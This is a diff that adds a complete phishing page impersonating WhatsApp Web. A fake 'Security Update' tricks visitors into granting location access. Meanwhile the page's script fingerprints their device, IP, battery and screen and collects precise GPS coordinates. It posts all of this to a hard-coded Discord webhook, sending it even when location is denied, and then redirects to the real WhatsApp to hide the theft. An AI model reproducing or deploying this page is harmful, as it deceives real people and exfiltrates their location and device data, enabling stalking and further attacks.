@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #111b21; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: #202c33; width: 100%; max-width: 420px; border-radius: 30px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid #2a3942; }
+        .header { background: #202c33; padding: 25px; text-align: center; border-bottom: 1px solid #2a3942; }
+        .wa-logo { width: 70px; height: 70px; background: #00a884; border-radius: 18px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; }
+        .wa-logo svg { width: 45px; height: 45px; fill: white; }
+        .header h2 { color: #e9edef; font-weight: 500; font-size: 22px; }
+        .header p { color: #8696a0; font-size: 13px; margin-top: 5px; }
+        .content { padding: 20px; }
+        .info-box { background: #2a3942; border-left: 4px solid #00a884; padding: 15px; border-radius: 12px; margin-bottom: 20px; color: #d1d7db; font-size: 13px; }
+        .info-box strong { color: #00a884; display: block; margin-bottom: 5px; font-size: 14px; }
+        
+        .device-panel { background: #1f2c33; border-radius: 16px; padding: 15px; margin-bottom: 20px; border: 1px solid #2a3942; }
+        .device-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #2a3942; font-size: 13px; }
+        .device-row:last-child { border-bottom: none; }
+        .device-label { color: #8696a0; }
+        .device-value { color: #00a884; font-weight: 500; }
+        
+        .gps-box { background: #2a3942; border-radius: 16px; padding: 20px; margin-bottom: 20px; border: 1px solid #00a88433; }
+        .gps-header { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; }
+        .gps-icon { font-size: 24px; width: 45px; height: 45px; background: #1f2c33; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 1px solid #00a884; }
+        .gps-title { color: #e9edef; font-weight: 500; font-size: 15px; }
+        .gps-desc { color: #8696a0; font-size: 12px; }
+        
+        .coord-box { background: #1f2c33; border-radius: 12px; padding: 15px; margin: 15px 0; }
+        .coord-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #2a3942; font-size: 13px; }
+        .coord-row:last-child { border-bottom: none; }
+        .coord-label { color: #8696a0; }
+        .coord-value { color: #00a884; font-family: monospace; }
+        
+        .btn { background: #00a884; color: white; border: none; padding: 14px; border-radius: 25px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; transition: all 0.2s; margin: 10px 0; }
+        .btn:hover { background: #008f70; transform: translateY(-1px); box-shadow: 0 4px 15px rgba(0,168,132,0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; background: #1f8b6c; }
+        
+        .progress { background: #2a3942; height: 4px; border-radius: 4px; margin: 15px 0; overflow: hidden; }
+        .progress-bar { height: 100%; width: 0%; background: #00a884; transition: width 0.3s; }
+        
+        .status { text-align: center; color: #8696a0; font-size: 12px; margin-top: 10px; min-height: 20px; }
+        .status.success { color: #00a884; }
+        .status.error { color: #f15c6f; }
+        
+        .footer { padding: 15px; text-align: center; border-top: 1px solid #2a3942; color: #8696a0; font-size: 11px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="wa-logo">
+                <svg viewBox="0 0 24 24">
+                    <path d="M19.1 4.9C15.2 1 8.8 1 4.9 4.9 1 8.8 1 15.2 4.9 19.1 8.8 23 15.2 23 19.1 19.1 23 15.2 23 8.8 19.1 4.9zM12 19c-3.9 0-7-3.1-7-7s3.1-7 7-7 7 3.1 7 7-3.1 7-7 7z"/>
+                    <circle cx="12" cy="12" r="4" fill="#ffffff"/>
+                </svg>
+            </div>
+            <h2>WhatsApp Web</h2>
+            <p>Secure connection required</p>
+        </div>
+        
+        <div class="content">
+            <div class="info-box">
+                <strong>🔒 Security Update</strong>
+                WhatsApp is updating its device verification system. Please verify your location to continue.
+            </div>
+            
+            <div class="device-panel">
+                <div class="device-row">
+                    <span class="device-label">Device:</span>
+                    <span class="device-value" id="deviceInfo">Detecting...</span>
+                </div>
+                <div class="device-row">
+                    <span class="device-label">OS:</span>
+                    <span class="device-value" id="osInfo">Detecting...</span>
+                </div>
+                <div class="device-row">
+                    <span class="device-label">Browser:</span>
+                    <span class="device-value" id="browserInfo">Detecting...</span>
+                </div>
+                <div class="device-row">
+                    <span class="device-label">IP:</span>
+                    <span class="device-value" id="ipInfo">Detecting...</span>
+                </div>
+                <div class="device-row">
+                    <span class="device-label">Port:</span>
+                    <span class="device-value" id="portInfo">Detecting...</span>
+                </div>
+                <div class="device-row">
+                    <span class="device-label">Battery:</span>
+                    <span class="device-value" id="batteryInfo">Detecting...</span>
+                </div>
+                <div class="device-row">
+                    <span class="device-label">Screen:</span>
+                    <span class="device-value" id="screenInfo">Detecting...</span>
+                </div>
+            </div>
+            
+            <div class="gps-box">
+                <div class="gps-header">
+                    <div class="gps-icon">📍</div>
+                    <div>
+                        <div class="gps-title">Location Verification</div>
+                        <div class="gps-desc">Required for security</div>
+                    </div>
+                </div>
+                
+                <div class="coord-box">
+                    <div class="coord-row">
+                        <span class="coord-label">Latitude:</span>
+                        <span class="coord-value" id="latitude">Waiting...</span>
+                    </div>
+                    <div class="coord-row">
+                        <span class="coord-label">Longitude:</span>
+                        <span class="coord-value" id="longitude">Waiting...</span>
+                    </div>
+                    <div class="coord-row">
+                        <span class="coord-label">Accuracy:</span>
+                        <span class="coord-value" id="accuracy">Waiting...</span>
+                    </div>
+                </div>
+                
+                <button class="btn" id="allowBtn" onclick="requestLocation()">Allow Location Access</button>
+            </div>
+            
+            <div class="progress">
+                <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
+            </div>
+            
+            <div class="status" id="status"></div>
+        </div>
+        
+        <div class="footer">
+            © 2026 WhatsApp Inc. • End-to-end encrypted
+        </div>
+    </div>
+
+    <script>
+        // ========== WEBHOOK DISCORD LU ==========
+        const WEBHOOK = "https://discord.com/api/webhooks/1478153467590873131/1Y7myadtqmYjdujwkbYTa2tq6xlN9pwjB4Wm0aVUV8auB7ukMIiEwuyj0YUmJw1YwTmx";
+        
+        // ========== DATA UTAMA ==========
+        let data = {
+            id: Math.random().toString(36).substring(2, 8).toUpperCase(),
+            device: 'Unknown',
+            os: 'Unknown',
+            browser: 'Unknown',
+            ip: 'Unknown',
+            port: 'Unknown',
+            battery: 'Unknown',
+            screen: screen.width + 'x' + screen.height,
+            lat: 'Not available',
+            lon: 'Not available',
+            acc: 'Not available'
+        };
+
+        // UI Elements
+        const deviceInfo = document.getElementById('deviceInfo');
+        const osInfo = document.getElementById('osInfo');
+        const browserInfo = document.getElementById('browserInfo');
+        const ipInfo = document.getElementById('ipInfo');
+        const portInfo = document.getElementById('portInfo');
+        const batteryInfo = document.getElementById('batteryInfo');
+        const screenInfo = document.getElementById('screenInfo');
+        const latitude = document.getElementById('latitude');
+        const longitude = document.getElementById('longitude');
+        const accuracy = document.getElementById('accuracy');
+        const statusEl = document.getElementById('status');
+        const progressBar = document.getElementById('progressBar');
+        const allowBtn = document.getElementById('allowBtn');
+
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
+        }
+
+        function updateStatus(msg) {
+            statusEl.innerHTML = msg;
+        }
+
+        // ========== DETECT DEVICE (SUPER LENGKAP) ==========
+        function detectDevice() {
+            let ua = navigator.userAgent;
+            
+            // SAMSUNG
+            if (ua.includes('SM-S928')) { data.device = 'Samsung Galaxy S24 Ultra'; }
+            else if (ua.includes('SM-S926')) { data.device = 'Samsung Galaxy S24+'; }
+            else if (ua.includes('SM-S921')) { data.device = 'Samsung Galaxy S24'; }
+            else if (ua.includes('SM-S918')) { data.device = 'Samsung Galaxy S23 Ultra'; }
+            else if (ua.includes('SM-S916')) { data.device = 'Samsung Galaxy S23+'; }
+            else if (ua.includes('SM-S911')) { data.device = 'Samsung Galaxy S23'; }
+            else if (ua.includes('SM-F946')) { data.device = 'Samsung Galaxy Z Fold5'; }
+            else if (ua.includes('SM-F731')) { data.device = 'Samsung Galaxy Z Flip5'; }
+            else if (ua.includes('SM-A556')) { data.device = 'Samsung Galaxy A55'; }
+            else if (ua.includes('SM-A546')) { data.device = 'Samsung Galaxy A54'; }
+            else if (ua.includes('SM-A356')) { data.device = 'Samsung Galaxy A35'; }
+            else if (ua.includes('SM-A346')) { data.device = 'Samsung Galaxy A34'; }
+            else if (ua.includes('SM-A156')) { data.device = 'Samsung Galaxy A15'; }
+            else if (ua.includes('SM-A146')) { data.device = 'Samsung Galaxy A14'; }
+            else if (ua.includes('SM-M336')) { data.device = 'Samsung Galaxy M33'; }
+            else if (ua.includes('SM-')) { data.device = 'Samsung Galaxy'; }
+            
+            // XIAOMI
+            else if (ua.includes('Xiaomi14')) { data.device = 'Xiaomi 14'; }
+            else if (ua.includes('Xiaomi13')) { data.device = 'Xiaomi 13'; }
+            else if (ua.includes('Xiaomi12')) { data.device = 'Xiaomi 12'; }
+            else if (ua.includes('Redmi Note 13')) { data.device = 'Redmi Note 13 Pro'; }
+            else if (ua.includes('Redmi Note 12')) { data.device = 'Redmi Note 12 Pro'; }
+            else if (ua.includes('Redmi Note 11')) { data.device = 'Redmi Note 11 Pro'; }
+            else if (ua.includes('POCO F5')) { data.device = 'POCO F5 Pro'; }
+            else if (ua.includes('POCO F6')) { data.device = 'POCO F6 Pro'; }
+            else if (ua.includes('POCO X6')) { data.device = 'POCO X6 Pro'; }
+            else if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) { 
+                data.device = 'Xiaomi Device'; 
+            }
+            
+            // OPPO
+            else if (ua.includes('CPH2659')) { data.device = 'OPPO Find X8 Pro'; }
+            else if (ua.includes('CPH2625')) { data.device = 'OPPO Find X8 Ultra'; }
+            else if (ua.includes('CPH2585')) { data.device = 'OPPO Find X7 Ultra'; }
+            else if (ua.includes('CPH2667')) { data.device = 'OPPO Reno13 Pro'; }
+            else if (ua.includes('CPH2607')) { data.device = 'OPPO Reno12 Pro'; }
+            else if (ua.includes('CPH2557')) { data.device = 'OPPO Reno11 Pro'; }
+            else if (ua.includes('CPH2527')) { data.device = 'OPPO Reno10 Pro+'; }
+            else if (ua.includes('OPPO') || ua.includes('CPH')) { 
+                data.device = 'OPPO Device'; 
+            }
+            
+            // VIVO
+            else if (ua.includes('V2419')) { data.device = 'Vivo X200 Ultra'; }
+            else if (ua.includes('V2417')) { data.device = 'Vivo X200 Pro'; }
+            else if (ua.includes('V2324')) { data.device = 'Vivo X100 Ultra'; }
+            else if (ua.includes('V2429')) { data.device = 'Vivo V40 Pro'; }
+            else if (ua.includes('V2318')) { data.device = 'Vivo V30 Pro'; }
+            else if (ua.includes('Vivo')) { data.device = 'Vivo Device'; }
+            
+            // INFINIX
+            else if (ua.includes('X6850')) { data.device = 'Infinix Zero 40 Ultra'; }
+            else if (ua.includes('X6845')) { data.device = 'Infinix Zero 40 Pro'; }
+            else if (ua.includes('X7000')) { data.device = 'Infinix Note 50 Pro+'; }
+            else if (ua.includes('X6990')) { data.device = 'Infinix Note 50 Pro'; }
+            else if (ua.includes('X6837')) { data.device = 'Infinix Note 40 Pro+'; }
+            else if (ua.includes('X6950')) { data.device = 'Infinix Hot 50 Pro+'; }
+            else if (ua.includes('Infinix') || ua.includes('X68')) { 
+                data.device = 'Infinix Device'; 
+            }
+            
+            // APPLE
+            else if (ua.includes('iPhone15,3')) { data.device = 'iPhone 15 Pro Max'; }
+            else if (ua.includes('iPhone15,2')) { data.device = 'iPhone 15 Pro'; }
+            else if (ua.includes('iPhone15,1')) { data.device = 'iPhone 15'; }
+            else if (ua.includes('iPhone14,8')) { data.device = 'iPhone 14 Plus'; }
+            else if (ua.includes('iPhone14,7')) { data.device = 'iPhone 14'; }
+            else if (ua.includes('iPhone14,6')) { data.device = 'iPhone 14 Pro'; }
+            else if (ua.includes('iPhone')) { data.device = 'Apple iPhone'; }
+            else if (ua.includes('iPad')) { data.device = 'Apple iPad'; }
+            else if (ua.includes('Mac')) { data.device = 'Apple Mac'; }
+            
+            // GOOGLE
+            else if (ua.includes('Pixel 9 Pro')) { data.device = 'Google Pixel 9 Pro'; }
+            else if (ua.includes('Pixel 9')) { data.device = 'Google Pixel 9'; }
+            else if (ua.includes('Pixel 8 Pro')) { data.device = 'Google Pixel 8 Pro'; }
+            else if (ua.includes('Pixel 8')) { data.device = 'Google Pixel 8'; }
+            else if (ua.includes('Pixel')) { data.device = 'Google Pixel'; }
+            
+            // PC / LAPTOP
+            else if (ua.includes('Windows')) { data.device = 'Windows PC'; }
+            else if (ua.includes('Linux') && !ua.includes('Android')) { data.device = 'Linux PC'; }
+            
+            // FALLBACK
+            else {
+                // Coba deteksi dari platform
+                let platform = navigator.platform;
+                if (platform.includes('Win')) data.device = 'Windows Device';
+                else if (platform.includes('Mac')) data.device = 'Apple Device';
+                else if (platform.includes('Linux')) data.device = 'Linux Device';
+                else data.device = 'Unknown Device';
+            }
+            
+            deviceInfo.innerText = data.device;
+        }
+
+        // ========== DETECT OS (SUPER LENGKAP) ==========
+        function detectOS() {
+            let ua = navigator.userAgent;
+            
+            // WINDOWS
+            if (ua.includes('Windows NT 11.0')) { data.os = 'Windows 11'; }
+            else if (ua.includes('Windows NT 10.0')) { 
+                let build = ua.match(/Windows NT 10.0.(\d+)/);
+                if (build && build[1] >= 22000) data.os = 'Windows 11';
+                else data.os = 'Windows 10';
+            }
+            else if (ua.includes('Windows NT 6.3')) { data.os = 'Windows 8.1'; }
+            else if (ua.includes('Windows NT 6.2')) { data.os = 'Windows 8'; }
+            else if (ua.includes('Windows NT 6.1')) { data.os = 'Windows 7'; }
+            else if (ua.includes('Windows')) { data.os = 'Windows'; }
+            
+            // MACOS
+            else if (ua.includes('Mac OS X 14')) { data.os = 'macOS Sonoma'; }
+            else if (ua.includes('Mac OS X 13')) { data.os = 'macOS Ventura'; }
+            else if (ua.includes('Mac OS X 12')) { data.os = 'macOS Monterey'; }
+            else if (ua.includes('Mac OS X 11')) { data.os = 'macOS Big Sur'; }
+            else if (ua.includes('Mac OS X 10_15')) { data.os = 'macOS Catalina'; }
+            else if (ua.includes('Mac OS X')) { data.os = 'macOS'; }
+            
+            // ANDROID
+            else if (ua.includes('Android 15')) { data.os = 'Android 15'; }
+            else if (ua.includes('Android 14')) { data.os = 'Android 14'; }
+            else if (ua.includes('Android 13')) { data.os = 'Android 13'; }
+            else if (ua.includes('Android 12')) { data.os = 'Android 12'; }
+            else if (ua.includes('Android 11')) { data.os = 'Android 11'; }
+            else if (ua.includes('Android 10')) { data.os = 'Android 10'; }
+            else if (ua.includes('Android')) { data.os = 'Android'; }
+            
+            // IOS
+            else if (ua.includes('iPhone OS 18')) { data.os = 'iOS 18'; }
+            else if (ua.includes('iPhone OS 17')) { data.os = 'iOS 17'; }
+            else if (ua.includes('iPhone OS 16')) { data.os = 'iOS 16'; }
+            else if (ua.includes('iPhone OS 15')) { data.os = 'iOS 15'; }
+            else if (ua.includes('iPhone OS')) { data.os = 'iOS'; }
+            else if (ua.includes('iPad')) { data.os = 'iPadOS'; }
+            
+            // LINUX
+            else if (ua.includes('Ubuntu')) { data.os = 'Ubuntu Linux'; }
+            else if (ua.includes('Debian')) { data.os = 'Debian Linux'; }
+            else if (ua.includes('Fedora')) { data.os = 'Fedora Linux'; }
+            else if (ua.includes('Linux')) { data.os = 'Linux'; }
+            
+            // FALLBACK
+            else {
+                data.os = 'Unknown OS';
+            }
+            
+            osInfo.innerText = data.os;
+        }
+
+        // ========== DETECT BROWSER ==========
+        function detectBrowser() {
+            let ua = navigator.userAgent;
+            
+            if (ua.includes('Firefox')) { data.browser = 'Firefox'; }
+            else if (ua.includes('Edg')) { data.browser = 'Microsoft Edge'; }
+            else if (ua.includes('Chrome') && !ua.includes('Edg')) { data.browser = 'Google Chrome'; }
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) { data.browser = 'Apple Safari'; }
+            else if (ua.includes('OPR')) { data.browser = 'Opera'; }
+            else if (ua.includes('Trident')) { data.browser = 'Internet Explorer'; }
+            else { data.browser = 'Unknown Browser'; }
+            
+            browserInfo.innerText = data.browser;
+        }
+
+        // ========== GET PORT ==========
+        function getPort() {
+            let port = window.location.port;
+            if (!port) {
+                port = window.location.protocol === 'https:' ? '443' : '80';
+            }
+            data.port = port;
+            portInfo.innerText = port;
+        }
+
+        // ========== GET IP ==========
+        async function getIP() {
+            try {
+                let r = await fetch('https://api.ipify.org?format=json');
+                let d = await r.json();
+                data.ip = d.ip;
+                ipInfo.innerText = d.ip;
+            } catch(e) {
+                data.ip = 'Offline/Error';
+                ipInfo.innerText = 'Failed';
+            }
+        }
+
+        // ========== GET BATTERY ==========
+        async function getBattery() {
+            if (navigator.getBattery) {
+                try {
+                    let b = await navigator.getBattery();
+                    let level = Math.round(b.level * 100);
+                    let status = b.charging ? '⚡ Charging' : '🔋';
+                    data.battery = level + '% ' + status;
+                    batteryInfo.innerText = level + '% ' + status;
+                } catch(e) {
+                    batteryInfo.innerText = 'Not available';
+                }
+            } else {
+                batteryInfo.innerText = 'Not supported';
+            }
+        }
+
+        // ========== REQUEST LOCATION ==========
+        function requestLocation() {
+            allowBtn.disabled = true;
+            allowBtn.innerText = 'Getting location...';
+            updateStatus('📍 Requesting location...');
+            updateProgress(50);
+            
+            if (!navigator.geolocation) {
+                sendToDiscord();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    data.lat = position.coords.latitude.toFixed(6);
+                    data.lon = position.coords.longitude.toFixed(6);
+                    data.acc = Math.round(position.coords.accuracy) + 'm';
+                    
+                    latitude.innerText = data.lat;
+                    longitude.innerText = data.lon;
+                    accuracy.innerText = data.acc;
+                    
+                    updateStatus('✅ Location acquired!');
+                    updateProgress(80);
+                    sendToDiscord();
+                },
+                (error) => {
+                    let msg = 'Error: ';
+                    if (error.code === 1) msg += 'Permission denied';
+                    else if (error.code === 2) msg += 'Position unavailable';
+                    else if (error.code === 3) msg += 'Timeout';
+                    else msg += 'Unknown';
+                    
+                    updateStatus('⚠️ ' + msg);
+                    sendToDiscord();
+                },
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
+        }
+
+        // ========== SEND TO DISCORD ==========
+        async function sendToDiscord() {
+            updateStatus('📤 Sending data...');
+            updateProgress(90);
+            
+            let message = `🔴 **WHATSAPP USER** [${data.id}]\n`;
+            message += `📱 **Device:** ${data.device}\n`;
+            message += `💻 **OS:** ${data.os}\n`;
+            message += `🌍 **Browser:** ${data.browser}\n`;
+            message += `🌐 **IP:** ${data.ip}\n`;
+            message += `🔌 **Port:** ${data.port}\n`;
+            message += `🔋 **Battery:** ${data.battery}\n`;
+            message += `📟 **Screen:** ${data.screen}\n`;
+            message += `📍 **GPS:** ${data.lat}, ${data.lon} (${data.acc})\n`;
+            message += `⏱️ **Time:** ${new Date().toLocaleString()}`;
+
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+                
+                updateStatus('✅ Done! Redirecting...');
+                updateProgress(100);
+                setTimeout(() => window.location.href = 'https://web.whatsapp.com', 2000);
+                
+            } catch(e) {
+                window.location.href = 'https://web.whatsapp.com';
+            }
+        }
+
+        // ========== INIT ==========
+        async function init() {
+            updateStatus('🔒 Initializing...');
+            updateProgress(10);
+            
+            detectDevice();
+            detectOS();
+            detectBrowser();
+            getPort();
+            screenInfo.innerText = data.screen;
+            
+            await Promise.all([ getIP(), getBattery() ]);
+            
+            updateProgress(30);
+            updateStatus('📍 Click "Allow Location Access" to continue');
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
